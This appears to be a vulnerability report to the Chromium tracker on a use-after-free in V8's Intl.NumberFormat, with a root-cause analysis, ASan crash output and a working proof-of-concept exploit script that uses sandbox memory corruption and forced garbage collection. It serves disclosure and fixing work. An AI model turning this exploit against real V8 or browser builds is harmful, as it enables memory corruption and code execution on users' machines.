# Use-After-Free Vulnerability in JSNumberFormat

Issue URL: https://issues.chromium.org/issues/472139305
VRP-Reward: TBD
Date: (unknown)

## Executive Summary

A use-after-free (UAF) vulnerability exists in V8's `JSNumberFormat` implementation that allows attackers to execute arbitrary code or cause denial of service. The vulnerability is triggered when calling `Intl.NumberFormat.prototype.format()`, `formatToParts()`, `formatRange()`, or `formatRangeToParts()` with a malicious object that has a custom `valueOf` or `Symbol.toPrimitive` method.

## Vulnerability Details

### Root Cause

The vulnerability is located in `v8/src/objects/js-number-format.cc` in the following functions:

- `JSNumberFormat::NumberFormatFunction()` (line ~2116)
- `JSNumberFormat::FormatToParts()` (line ~2139)
- `JSNumberFormat::FormatNumericRange()` (via `PartitionNumberRangePattern`)
- `JSNumberFormat::FormatNumericRangeToParts()` (via `PartitionNumberRangePattern`)

**The Bug:**

These functions store a raw C++ pointer to the ICU `LocalizedNumberFormatter` object before calling `IntlMathematicalValue::From()`, which can trigger garbage collection:

```cpp
MaybeDirectHandle<String> JSNumberFormat::NumberFormatFunction(
    Isolate* isolate, DirectHandle<JSNumberFormat> number_format,
    Handle<Object> value) {
  // 1. Raw pointer obtained here
  icu::number::LocalizedNumberFormatter* fmt =
      number_format->icu_number_formatter()->raw();
  CHECK_NOT_NULL(fmt);

  // 4. Let x be ? ToIntlMathematicalValue(value).
  IntlMathematicalValue x;
  // 2. This can trigger GC via ToPrimitive -> valueOf/toString
  ASSIGN_RETURN_ON_EXCEPTION(isolate, x,
                             IntlMathematicalValue::From(isolate, value));

  // 5. Return FormatNumeric(nf, x).
  // 3. Raw pointer used after potential GC - UAF!
  Maybe<icu::number::FormattedNumber> maybe_formatted =
      IntlMathematicalValue::FormatNumeric(isolate, *fmt, x);
  ...
  // 4. Raw pointer used again - UAF!
  return FormatToString(isolate, formatted, *fmt, x.IsNaN());
}

```

### Vulnerability Flow

1. **Raw Pointer Acquisition**: The code obtains a raw pointer `fmt` to the ICU formatter via `number_format->icu_number_formatter()->raw()`
2. **GC Trigger Point**: `IntlMathematicalValue::From()` is called, which internally calls `JSReceiver::ToPrimitive()` if the input is an object. This executes JavaScript code (the object's `valueOf` or `Symbol.toPrimitive` method).
3. **Memory Corruption**: An attacker can provide a malicious object whose `valueOf` method:
    - Corrupts heap metadata via the Sandbox memory view
    - Triggers garbage collection via `gc()`
4. **Use-After-Free**: After GC runs, the Managed object containing the ICU formatter may be freed, but the raw pointer `fmt` is still used, resulting in a UAF.

### Affected Methods

All four public methods of `Intl.NumberFormat` that accept user-provided values are affected:

1. `Intl.NumberFormat.prototype.format(value)`
2. `Intl.NumberFormat.prototype.formatToParts(value)`
3. `Intl.NumberFormat.prototype.formatRange(start, end)`
4. `Intl.NumberFormat.prototype.formatRangeToParts(start, end)`

## Exploitation

### Prerequisites

- V8 with sandbox testing enabled (`-sandbox-testing`)
- GC exposure (`-expose-gc`)

### Exploit Technique

The PoC uses V8's sandbox memory view to corrupt the heap and trigger the UAF:

```jsx
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const evil = new Proxy({}, {
  get: (t, p) => (p === Symbol.toPrimitive || p === 'valueOf') ? () => {
    if (!fired) {
      fired = true;
      // Corrupt heap to trigger UAF
      mem.setUint32(addr + 16, 0x1, true);
      gc();
    }
    return 42;
  } : undefined
});

fmt.format(evil);  // Triggers UAF

```

### Impact

- **Confidentiality**: High - Can read arbitrary memory
- **Integrity**: High - Can modify arbitrary memory
- **Availability**: High - Can cause crashes or infinite loops
- **Scope**: The vulnerability allows sandbox escape in V8

## ASan Output Analysis

```
=================================================================
==17==ERROR: AddressSanitizer: heap-use-after-free on address 0x7af8ec3e1178 at pc 0x6272652b42bd bp 0x7ffe1866f2a0 sp 0x7ffe1866f298
READ of size 4 at 0x7af8ec3e1178 thread T0
    #0 0x6272652b42bc in __cxx_atomic_load<int> gen/third_party/libc++/src/include/__atomic/support/c11.h:81:10
    #1 0x6272652b42bc in load gen/third_party/libc++/src/include/__atomic/atomic.h:70:12
    #2 0x6272652b42bc in umtx_loadAcquire third_party/icu/source/common/umutex.h:76:16
    #3 0x6272652b42bc in computeCompiled third_party/icu/source/i18n/number_fluent.cpp:691:28
    #4 0x6272652b42bc in icu_74::number::LocalizedNumberFormatter::formatImpl(icu_74::number::impl::UFormattedNumberData*, UErrorCode&) const third_party/icu/source/i18n/number_fluent.cpp:644:9
    #5 0x6272652b44bd in icu_74::number::LocalizedNumberFormatter::formatDouble(double, UErrorCode&) const third_party/icu/source/i18n/number_fluent.cpp:593:5
    #6 0x6272618bf893 in v8::internal::(anonymous namespace)::IcuFormatNumber(v8::internal::Isolate*, icu_74::number::LocalizedNumberFormatter const&, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:1579:33
    #7 0x6272618be759 in v8::internal::IntlMathematicalValue::FormatNumeric(v8::internal::Isolate*, icu_74::number::LocalizedNumberFormatter const&, v8::internal::IntlMathematicalValue const&) src/objects/js-number-format.cc:1608:10
    #8 0x6272618c6706 in v8::internal::JSNumberFormat::NumberFormatFunction(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSNumberFormat>, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:2133:7
    #9 0x627260b3ab91 in v8::internal::Builtin_Impl_NumberFormatInternalFormatNumber(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:532:3
    #10 0x627264fd5d35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #11 0x627264f2a7a9 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x627264f2755b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #13 0x627264f272aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #14 0x627260dbcf7b in Call src/execution/simulator.h:212:12
    #15 0x627260dbcf7b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #16 0x627260dbe538 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #17 0x6272609bb07d in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1964:7
    #18 0x6272606e3fc6 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #19 0x62726071b49d in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5480:10
    #20 0x627260727293 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6436:37
    #21 0x6272607266c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6344:18
    #22 0x627260729da7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7234:18
    #23 0x7d98ed3261c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #24 0x7d98ed32628a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #25 0x6272605d7024 in _start (/src/v8/out/x64.asan/d8+0x12cd024) (BuildId: 790fca5b8965ae46)

0x7af8ec3e1178 is located 504 bytes inside of 520-byte region [0x7af8ec3e0f80,0x7af8ec3e1188)
freed by thread T0 here:
    #0 0x6272606b25c2 in operator delete(void*, unsigned long) (/src/v8/out/x64.asan/d8+0x13a85c2) (BuildId: 790fca5b8965ae46)
    #1 0x627261889917 in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:122:7
    #2 0x627261889917 in ~shared_ptr gen/third_party/libc++/src/include/__memory/shared_ptr.h:561:17
    #3 0x627261889917 in void v8::internal::detail::Destructor<icu_74::number::LocalizedNumberFormatter>(void*) src/objects/managed-inl.h:21:3
    #4 0x62726196f51b in v8::internal::(anonymous namespace)::ManagedObjectFinalizerSecondPass(v8::WeakCallbackInfo<void> const&) src/objects/managed.cc:21:3
    #5 0x627260e7b118 in Invoke src/handles/global-handles.cc:867:3
    #6 0x627260e7b118 in v8::internal::GlobalHandles::InvokeSecondPassPhantomCallbacks() src/handles/global-handles.cc:768:18
    #7 0x627260e7cda3 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::GCCallbackFlags) src/handles/global-handles.cc:886:5
    #8 0x6272610003af in operator() src/heap/heap.cc:1712:34
    #9 0x6272610003af in InvokeExternalCallbacks<(lambda at ../../src/heap/heap.cc:1707:38)> src/heap/heap.cc:1475:3
    #10 0x6272610003af in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck) src/heap/heap.cc:1707:3
    #11 0x627260e592f0 in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) src/extensions/gc-extension.cc:204:17
    #12 0x627260e57d9b in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) src/extensions/gc-extension.cc:291:5
    #13 0x627264f2c543 in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
    #14 0x627264f2a7a9 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #15 0x627264f2755b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #16 0x627264f272aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #17 0x627260dbcf7b in Call src/execution/simulator.h:212:12
    #18 0x627260dbcf7b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #19 0x627260dbac4e in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) src/execution/execution.cc:532:10
    #20 0x6272618d0f02 in T<v8::internal::Object>::MaybeType v8::internal::JSReceiver::ToPrimitive<v8::internal::Handle>(v8::internal::Isolate*, T<v8::internal::JSReceiver>, v8::internal::ToPrimitiveHint) src/objects/js-objects.cc:2122:5
    #21 0x6272618c2807 in v8::internal::IntlMathematicalValue::From(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:1688:5
    #22 0x6272618c66c0 in v8::internal::JSNumberFormat::NumberFormatFunction(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSNumberFormat>, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:2128:3
    #23 0x627260b3ab91 in v8::internal::Builtin_Impl_NumberFormatInternalFormatNumber(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:532:3
    #24 0x627264fd5d35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #25 0x627264f2a7a9 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #26 0x627264f2755b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #27 0x627264f272aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #28 0x627260dbcf7b in Call src/execution/simulator.h:212:12
    #29 0x627260dbcf7b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #30 0x627260dbe538 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #31 0x6272609bb07d in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1964:7
    #32 0x6272606e3fc6 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #33 0x62726071b49d in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5480:10
    #34 0x627260727293 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6436:37
    #35 0x6272607266c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6344:18
    #36 0x627260729da7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7234:18

previously allocated by thread T0 here:
    #0 0x6272606b195d in operator new(unsigned long) (/src/v8/out/x64.asan/d8+0x13a795d) (BuildId: 790fca5b8965ae46)
    #1 0x627261886806 in __libcpp_allocate<std::__Cr::__shared_ptr_emplace<icu_74::number::LocalizedNumberFormatter, std::__Cr::allocator<icu_74::number::LocalizedNumberFormatter> > > gen/third_party/libc++/src/include/__new/allocate.h:43:28
    #2 0x627261886806 in allocate gen/third_party/libc++/src/include/__memory/allocator.h:105:14
    #3 0x627261886806 in allocate gen/third_party/libc++/src/include/__memory/allocator_traits.h:259:16
    #4 0x627261886806 in __allocation_guard<std::__Cr::allocator<icu_74::number::LocalizedNumberFormatter> > gen/third_party/libc++/src/include/__memory/allocation_guard.h:55:16
    #5 0x627261886806 in allocate_shared<icu_74::number::LocalizedNumberFormatter, std::__Cr::allocator<icu_74::number::LocalizedNumberFormatter>, icu_74::number::LocalizedNumberFormatter &, 0> gen/third_party/libc++/src/include/__memory/shared_ptr.h:735:46
    #6 0x627261886806 in std::__Cr::shared_ptr<icu_74::number::LocalizedNumberFormatter> std::__Cr::make_shared<icu_74::number::LocalizedNumberFormatter, icu_74::number::LocalizedNumberFormatter&, 0>(icu_74::number::LocalizedNumberFormatter&) gen/third_party/libc++/src/include/__memory/shared_ptr.h:744:10
    #7 0x6272618bb024 in v8::internal::JSNumberFormat::New(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, char const*) src/objects/js-number-format.cc:1474:15
    #8 0x627260b38603 in LegacyFormatConstructor<v8::internal::JSNumberFormat> src/builtins/builtins-intl.cc:266:3
    #9 0x627260b38603 in v8::internal::Builtin_Impl_NumberFormatConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:461:10
    #10 0x627264fd5d35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #11 0x627264f2b072 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #12 0x6272650da35d in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #13 0x627264f2a7a9 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #14 0x627264f2755b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #15 0x627264f272aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #16 0x627260dbcf7b in Call src/execution/simulator.h:212:12
    #17 0x627260dbcf7b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #18 0x627260dbe538 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #19 0x6272609bb07d in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1964:7
    #20 0x6272606e3fc6 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #21 0x62726071b49d in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5480:10
    #22 0x627260727293 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6436:37
    #23 0x6272607266c5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6344:18
    #24 0x627260729da7 in v8::Shell::Main(int, char**) src/d8/d8.cc:7234:18
    #25 0x7d98ed3261c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #26 0x7d98ed32628a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #27 0x6272605d7024 in _start (/src/v8/out/x64.asan/d8+0x12cd024) (BuildId: 790fca5b8965ae46)

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/__atomic/support/c11.h:81:10 in __cxx_atomic_load<int>
Shadow bytes around the buggy address:
  0x7af8ec3e0e80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x7af8ec3e0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7af8ec3e0f80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7af8ec3e1000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7af8ec3e1080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x7af8ec3e1100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]
  0x7af8ec3e1180: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7af8ec3e1200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7af8ec3e1280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7af8ec3e1300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7af8ec3e1380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==17==ABORTING

## V8 sandbox violation detected!
```

The ASan output confirms:

1. The crash is a heap-use-after-free
2. The freed memory is the `LocalizedNumberFormatter` object (520 bytes)
3. The free happens during `ManagedObjectFinalizerSecondPass` triggered by GC
4. The GC was triggered from `IntlMathematicalValue::From` inside `NumberFormatFunction`

## PoC

```js
// JSNumberFormat Use-After-Free PoC
// Triggers AddressSanitizer: heap-use-after-free
//
// Vulnerability: In v8/src/objects/js-number-format.cc NumberFormatFunction()
// the raw ICU formatter pointer is obtained BEFORE GC can be triggered via
// ToPrimitive, and used AFTER the formatter may have been freed.
//
// Run: ./out/x64.asan/d8 --sandbox-testing --expose-gc ./pocs/uaf_0day/poc.js

// Initialize sandbox memory access
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// JSNumberFormat field offsets (from torque-generated headers)
// JSObject header: Map (0), properties (4), elements (8)
// locale: 12, icu_number_formatter: 16, bound_format: 20
const kIcuNumberFormatterOffset = 16;

// Create victim NumberFormat
const nf = new Intl.NumberFormat("en-US");
const nfAddr = Sandbox.getAddressOf(nf);

// Create a second NumberFormat and capture its Foreign pointer
// We'll store the handle in a way that doesn't keep nf2 alive
let nf2ForeignHandle = 0;

function setup() {
  const nf2 = new Intl.NumberFormat("de-DE");
  const nf2Addr = Sandbox.getAddressOf(nf2);
  nf2ForeignHandle = memory.getUint32(nf2Addr + kIcuNumberFormatterOffset, true);
  // nf2 goes out of scope here and can be collected
}

setup();

print(`[*] nf at: 0x${nfAddr.toString(16)}`);
print(`[*] Captured nf2 Foreign handle: 0x${nf2ForeignHandle.toString(16)}`);

let triggered = false;

const evil = {
  [Symbol.toPrimitive](hint) {
    if (!triggered) {
      triggered = true;
      
      // Corrupt nf's Foreign pointer to point to the captured handle
      // This makes nf reference the same Managed object as the now-dead nf2
      memory.setUint32(nfAddr + kIcuNumberFormatterOffset, nf2ForeignHandle, true);
      
      // Trigger GC to free the original formatter
      gc();
    }
    return 42;
  }
};

// Trigger the vulnerability
// The format() function will:
// 1. Get raw pointer from nf->icu_number_formatter()->raw() 
// 2. Call ToPrimitive on evil object -> triggers GC
// 3. The ICU formatter is freed (since nf2 is gone and nf now points elsewhere)
// 4. Use the dangling raw pointer -> UAF
nf.format(evil);
```